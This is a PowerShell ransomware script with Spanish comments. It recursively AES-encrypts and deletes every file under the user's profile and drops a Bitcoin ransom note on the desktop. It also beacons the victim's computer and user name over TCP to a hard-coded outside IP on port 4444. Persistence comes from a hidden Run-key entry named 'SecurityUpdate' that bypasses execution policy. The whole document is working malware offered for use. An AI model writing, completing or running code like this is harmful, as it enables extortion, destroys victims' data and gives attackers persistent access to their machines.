# Configuración
$AttackerIP = "178.156.158.72"  # IP para notificar al atacante
$PORT = 4444  # Puerto de escucha
$Key = [Convert]::ToBase64String((1..32 | ForEach-Object { Get-Random -Minimum 0 -Maximum 256 }))
$RansomNotePath = "$env:USERPROFILE\Desktop\RANSOM_NOTE.txt"

# Función para cifrar archivos
function Encrypt-Files {
    $files = Get-ChildItem -Path $env:USERPROFILE -Recurse -File -Exclude "RANSOM_NOTE.txt"
    foreach ($file in $files) {
        try {
            $content = [System.IO.File]::ReadAllBytes($file.FullName)
            $aes = New-Object System.Security.Cryptography.AesManaged
            $aes.Key = [Convert]::FromBase64String($Key)
            $aes.IV = $aes.IV
            $encryptor = $aes.CreateEncryptor()
            $encrypted = $encryptor.TransformFinalBlock($content, 0, $content.Length)
            [System.IO.File]::WriteAllBytes($file.FullName + ".locked", $encrypted)
            Remove-Item $file.FullName
        } catch {}
    }
}

# Crear nota de rescate
function Create-RansomNote {
    $note = @"
YOUR FILES HAVE BEEN LOCKED!
Send 1 Bitcoin to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
Then contact us at $AttackerIP:$PORT with your payment ID.
Your decryption key is: $Key
Don’t try anything funny—your files are gone without this key!
"@
    Set-Content -Path $RansomNotePath -Value $note
}

# Notificar al atacante
function Notify-Attacker {
    try {
        $client = New-Object System.Net.Sockets.TcpClient($AttackerIP, $PORT)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $writer.WriteLine("Ransomware executed on $env:COMPUTERNAME by $env:USERNAME")
        $writer.Flush()
        $client.Close()
    } catch {}
}

# Persistencia
function Add-Persistence {
    $scriptPath = "$env:APPDATA\Ransom.ps1"
    Copy-Item $PSCommandPath $scriptPath
    IEX "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /t REG_SZ /d `"powershell -ep bypass -w hidden -f $scriptPath`" /f" >$null 2>&1
}

# Ejecutar
Add-Persistence
Encrypt-Files
Create-RansomNote
Notify-Attacker